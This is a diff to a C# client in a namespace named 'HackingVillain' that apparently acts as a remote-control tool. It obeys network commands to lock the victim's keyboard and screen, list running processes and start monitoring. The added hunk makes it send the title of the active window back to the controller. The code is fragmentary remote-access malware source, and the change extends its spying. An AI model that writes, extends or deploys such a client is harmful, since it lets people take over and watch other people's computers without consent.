@@ -49,6 +49,7 @@ namespace HackingVillain
         ~Client()
         {
             _hook.Dispose();
+            _client.Close();
         }
 
         public void Send(string msg)
@@ -66,23 +67,23 @@ namespace HackingVillain
 
             string data = Encoding.UTF8.GetString(Buffer.GetBuffer(coming));
             data = data.TrimEnd('\0');
-            if(data == "Lock Key")
+            if (data == "Lock Key")
             {
                 _hook.Lock();
             }
-            else if(data == "UnLock Key")
+            else if (data == "UnLock Key")
             {
                 _hook.UnLock();
             }
-            else if(data == "Lock Screen")
+            else if (data == "Lock Screen")
             {
                 _lock.ShowDialog();
             }
-            else if(data == "UnLock Screen")
+            else if (data == "UnLock Screen")
             {
                 _lock.Fuck();
             }
-            else if(data == "Show Me The Process")
+            else if (data == "Show Me The Process")
             {
                 var processes = from p in Process.GetProcesses()
                                 where p.MainWindowTitle.Length > 0
@@ -97,6 +98,10 @@ namespace HackingVillain
             else if (data == "Stop Showing")
             {
                 _monitor.Stop();
+            }
+            else if (data == "Current Window")
+            {
+                Send(ForegroundWindow.GetActiveWindowTitle());
             }
         }
     }
